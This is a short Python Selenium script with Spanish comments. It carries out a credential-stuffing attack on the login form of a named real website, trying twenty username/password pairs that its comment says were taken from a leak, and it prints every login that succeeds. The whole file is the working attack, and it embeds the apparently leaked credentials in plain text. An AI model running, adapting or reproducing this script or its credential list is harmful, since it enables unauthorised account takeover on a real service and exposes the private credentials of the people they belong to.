from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
#Credenciales obtenidas desde leak
user = ["rodrigo","efariasn","cveas","zserrano","fmaldonadoc","mmaumora","pertica","doralisa","pcancino","norbean","jmacke","sgallardoa","gcrino","prsimon","jtriguero","imunita","hugo","maroalni","lilian","aschmi"]
passwords = ["martina","teresianovit","cmsa","conatia","349B","23j64U32","661","santamarta","VBSPCC","29NB54rh","8g535Q72","7437","gucrita","8611-8","hmsiae","9823","arayamarin","14al04MI","mafraroga","84t15Y91"]
#Arreglo para impresión por pantalla cuando se logre hacer un login
userexitoso = []
passexitoso = []

driver = webdriver.Chrome()
driver.get("https://www.fide.cl/")
ipass = 0
for x in user:
    driver.implicitly_wait(0.5)
    botonlogin = driver.find_element(By.ID, "menu-item-5520")
    botonlogin.click()
    usuarioinput = driver.find_element(By.NAME, "xoo-el-username")
    usuarioinput.send_keys(x)
    passinput = driver.find_element(By.NAME, "xoo-el-password")
    passinput.send_keys(passwords[ipass])
    passinput.send_keys(Keys.ENTER)
    time.sleep(2)
    #Agregar a arreglo en caso de que el login haya sido exitoso
    if "?login=success" in driver.current_url:
        userexitoso.append(x)
        passexitoso.append(passwords[ipass])
    driver.get("https://www.fide.cl")
    ipass=ipass+1
iexito = 0
for x in userexitoso:
    #Imprimir por pantalla en caso de que el login haya sido exitoso
    print("Login exitoso con: ")
    print (userexitoso[iexito] + " | " + passexitoso[iexito])
    iexito = iexito+1
#Cerrar navegador
driver.quit()